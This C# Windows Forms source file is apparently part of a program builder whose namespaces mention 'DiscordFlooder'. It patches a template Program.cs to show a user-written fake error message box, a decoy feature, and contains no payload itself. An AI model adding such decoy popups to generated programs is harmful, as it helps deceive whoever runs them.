using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;
using DiscordFlooder.Class.Design.Rainbow;
using ItroublveTSC;

namespace ItroublveTSC2
{
	public partial class frm2 : Form
	{
        #region GUI
        public frm2()
		{
			this.InitializeComponent();
			this.RainbowTimer.Start();
		}

		private void RainbowTimer_Tick(object sender, EventArgs e)
		{
			Rainbow.RainbowEffect();
			this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
			this.panel37.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
		}

		private void frm2_Load(object sender, EventArgs e)
		{
		}
        #region ClsBtn
        private void CloseBtn_Click(object sender, EventArgs e)
		{
			frm2 f = new frm2();
			f.Close();
			this.Close();
		}
        #endregion
        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
		{
			Mouse.x = Control.MousePosition.X - base.Location.X;
			Mouse.y = Control.MousePosition.Y - base.Location.Y;
		}

		private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			if (flag)
			{
				Mouse.newpoint = Control.MousePosition;
				Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
				Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
				base.Location = Mouse.newpoint;
			}
		}
        #endregion
        #region Compile chng
        private void roundBtn1_Click(object sender, EventArgs e)
        {
			bool flag = this.MessageTitleTxt.Text == "" || this.MessageTitleTxt.Text == "Title";
			bool flag1 = this.MessageDescTxt.Text == "" || this.MessageDescTxt.Text == "Message";
			if (!File.Exists("bin_copy/Program.cs"))
            {
				string test = @"bin";
				string test2 = @"bin_copy";
				frmMain.Copy(test, test2);
			}
			string text = File.ReadAllText("bin_copy/Program.cs");
			if (!flag)
			{
				text = text.Replace("Your Title", MessageTitleTxt.Text);
			}
			if (!flag1)
            {
				text = text.Replace("Your Desc", MessageDescTxt.Text);
			}
			if (!flag & !flag1)
            {
				text = text.Replace("//MessageBox", "MessageBox");
			}
			File.WriteAllText("bin_copy/Program.cs", text);
			frm2 f = new frm2();
			f.Close();
			this.Close();
		}
        #endregion
        #region Placeholder
        private void MessageTitleTxt_Enter(object sender, EventArgs e)
        {
			if (MessageTitleTxt.Text == "Title")
			{
				MessageTitleTxt.Text = "";
			}
		}

        private void MessageTitleTxt_Leave(object sender, EventArgs e)
        {
			if (MessageTitleTxt.Text == "")
			{
				MessageTitleTxt.Text = "Title";
			}
		}

        private void MessageDescTxt_Enter(object sender, EventArgs e)
        {
			if (MessageDescTxt.Text == "Your Error")
			{
				MessageDescTxt.Text = "";
			}
		}

        private void MessageDescTxt_Leave(object sender, EventArgs e)
        {
			if (MessageTitleTxt.Text == "")
			{
				MessageTitleTxt.Text = "Your Error";
			}
		}
        #endregion
    }
}
